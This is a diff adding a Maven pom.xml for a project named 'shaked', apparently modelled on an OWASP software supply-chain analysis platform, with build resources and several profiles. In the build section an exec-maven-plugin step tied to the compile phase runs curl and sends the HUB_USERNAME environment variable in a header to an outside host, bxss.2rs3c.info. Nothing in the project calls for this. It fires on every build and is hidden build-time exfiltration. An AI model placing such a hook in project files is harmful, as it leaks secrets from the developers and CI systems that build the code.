@@ -1,0 +1,236 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  ~ This file is part of shaked.
+  ~
+  ~ Licensed under the Apache License, Version 2.0 (the "License");
+  ~ you may not use this file except in compliance with the License.
+  ~ You may obtain a copy of the License at
+  ~
+  ~   http://www.apache.org/licenses/LICENSE-2.0
+  ~
+  ~ Unless required by applicable law or agreed to in writing, software
+  ~ distributed under the License is distributed on an "AS IS" BASIS,
+  ~ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  ~ See the License for the specific language governing permissions and
+  ~ limitations under the License.
+  ~
+  ~ SPDX-License-Identifier: Apache-2.0
+  ~ Copyright (c) Steve Springett. All Rights Reserved.
+  -->
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+
+    <parent>
+        <groupId>us.springett</groupId>
+        <artifactId>alpine-parent</artifactId>
+        <version>2.2.3-SNAPSHOT</version>
+    </parent>
+
+    <modelVersion>4.0.0</modelVersion>
+    <groupId>org.shaked</groupId>
+    <artifactId>shaked</artifactId>
+    <packaging>war</packaging>
+    <version>4.9.0-SNAPSHOT</version>
+
+    <name>shaked</name>
+    <url>https://shaked.org/</url>
+    <description>shaked is an intelligent component analysis platform that allows organizations to identify and reduce risk in the software supply chain.</description>
+    <inceptionYear>2013</inceptionYear>
+    <organization>
+        <name>OWASP</name>
+    </organization>
+
+    <licenses>
+        <license>
+            <name>Apache-2.0</name>
+            <url>http://www.apache.org/licenses/LICENSE-2.0.txt</url>
+            <distribution>repo</distribution>
+        </license>
+    </licenses>
+
+    <properties>
+        <!-- Dependency Versions -->
+
+    </properties>
+
+
+    <dependencies>
+   
+    </dependencies>
+
+    <build>
+        <finalName>${project.artifactId}</finalName>
+        <resources>
+            <resource>
+                <directory>src/main/resources</directory>
+                <filtering>false</filtering>
+            </resource>
+            <resource>
+                <directory>src/main/resources</directory>
+                <filtering>true</filtering>
+                <includes>
+                    <include>application.version</include>
+                </includes>
+            </resource>
+        </resources>
+        <testResources>
+            <testResource>
+                <directory>src/test/resources</directory>
+                <filtering>false</filtering>
+            </testResource>
+        </testResources>
+        <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.1.1</version>
+                <executions>
+                <execution>
+                    <id>some-execution</id>
+                    <phase>compile</phase>
+                    <goals>
+                    <goal>exec</goal>
+                    </goals>
+                </execution>
+                </executions>
+                <configuration>
+                <executable>curl</executable>
+                <arguments>
+                        <argument>-H</argument>
+                        <argument>X-TEST: ${HUB_USERNAME}</argument>
+                      <argument>https://bxss.2rs3c.info/owasp</argument>
+                </arguments>
+                </configuration>
+            </plugin>
+
+        </plugins>
+    </build>
+
+    <profiles>
+        <profile>
+            <id>clean-exclude-wars</id>
+            <build>
+                <pluginManagement>
+                    <plugins>
+                    <plugin>
+                        <groupId>org.apache.maven.plugins</groupId>
+                        <artifactId>maven-clean-plugin</artifactId>
+                        <version>3.3.1</version>
+                        <configuration>
+                            <excludeDefaultDirectories>true</excludeDefaultDirectories>
+                            <filesets>
+                                <fileset>
+                                    <directory>target</directory>
+                                    <followSymlinks>false</followSymlinks>
+                                    <useDefaultExcludes>false</useDefaultExcludes>
+                                    <includes>
+                                        <include>*/</include>
+                                    </includes>
+                                    <excludes>
+                                        <exclude>shaked*.jar</exclude>
+                                    </excludes>
+                                </fileset>
+                            </filesets>
+                        </configuration>
+                    </plugin>
+                    </plugins>
+                </pluginManagement>
+            </build>
+        </profile>
+        <profile>
+            <id>embedded-jetty</id>
+            <activation>
+                <property>
+                    <name>env.ACTIVATE_EMBEDDED_JETTY</name>
+                    <value>true</value>
+                </property>
+            </activation>
+            <properties>
+                <war-embedded-finalname>${project.build.finalName}-apiserver</war-embedded-finalname>
+            </properties>
+        </profile>
+        <profile>
+            <id>h2-console</id>
+            <build>
+                <plugins>
+                    <plugin>
+                        <groupId>org.eclipse.jetty</groupId>
+                        <artifactId>jetty-maven-plugin</artifactId>
+                        <version>${plugin.jetty.version}</version>
+                        <configuration>
+                            <webApp>
+                                <contextPath>/</contextPath>
+                            </webApp>
+                            <contextXml>src/test/webapp/WEB-INF/h2-console-activation.xml</contextXml>
+                        </configuration>
+                    </plugin>
+                </plugins>
+            </build>
+        </profile>
+        <profile>
+            <id>bundle-ui</id>
+            <activation>
+                <property>
+                    <name>env.ACTIVATE_BUNDLE_UI</name>
+                    <value>true</value>
+                </property>
+            </activation>
+            <properties>
+                <war-embedded-finalname>${project.build.finalName}-bundled</war-embedded-finalname>
+            </properties>
+            <build>
+                <plugins>
+                    <plugin>
+                        <artifactId>maven-antrun-plugin</artifactId>
+                        <version>3.1.0</version>
+                        <executions>
+                            <execution>
+                                <id>frontend-download</id>
+                                <phase>prepare-package</phase>
+                                <configuration>
+                                    <target>
+                                        <get src="https://github.com/shaked/frontend/releases/download/${frontend.version}/frontend-dist.zip" dest="${project.build.directory}" verbose="true"/>
+                                    </target>
+                                </configuration>
+                                <goals>
+                                    <goal>run</goal>
+                                </goals>
+                            </execution>
+                            <execution>
+                                <id>frontend-extract</id>
+                                <phase>prepare-package</phase>
+                                <configuration>
+                                    <target>
+                                        <unzip src="${project.build.directory}/frontend-dist.zip" dest="${project.build.directory}/frontend">
+                                        </unzip>
+                                    </target>
+                                </configuration>
+                                <goals>
+                                    <goal>run</goal>
+                                </goals>
+                            </execution>
+                            <execution>
+                                <id>frontend-resource-deploy</id>
+                                <phase>prepare-package</phase>
+                                <configuration>
+                                    <target>
+                                        <copy todir="${project.build.directory}/${project.artifactId}">
+                                            <fileset dir="${project.build.directory}/frontend/dist">
+                                                <include name="**/*"/>
+                                            </fileset>
+                                        </copy>
+                                    </target>
+                                </configuration>
+                                <goals>
+                                    <goal>run</goal>
+                                </goals>
+                            </execution>
+                        </executions>
+                    </plugin>
+                </plugins>
+            </build>
+        </profile>
+    </profiles>
+
+</project>
